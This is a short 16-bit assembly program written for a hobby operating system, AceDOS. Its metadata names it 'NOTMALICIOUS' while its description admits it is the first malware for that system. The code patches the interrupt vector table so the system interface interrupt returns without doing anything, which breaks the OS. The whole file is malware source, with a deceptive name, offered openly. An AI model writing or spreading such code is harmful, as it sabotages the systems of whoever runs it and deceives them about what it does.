bits 16

db 0x89

call get_ip
get_ip:
    pop bp
    sub bp, get_ip

mov di, [0x80]
shl di, 2
mov word [di], lret
mov word [di+2], 0
ret

lret:
iret

times (512*15)-($-$$) db 0

METADATATABLE:
.name:
    db "NOTMALICIOUS" ; up to 15 bytes of characters
    times (.name+15)-$ db 0 ; pad the remaining bytes with 0's
    db 0 ; null termination
.description:
    db "The first malware created for AceDOS. Removes the system interface interrupt from the IVT and cooks your OS." ; up to 255 bytes of characters
    times (.description + 255)-$ db 0 ; pad the remaining bytes with 0's
    db 0 ; null termination
.date:
    db "03/11/2025" ; up to 10 bytes of characters
    times (.date + 10)-$ db 0 ; pad the remaining bytes with 0's
    db 0 ; null termination
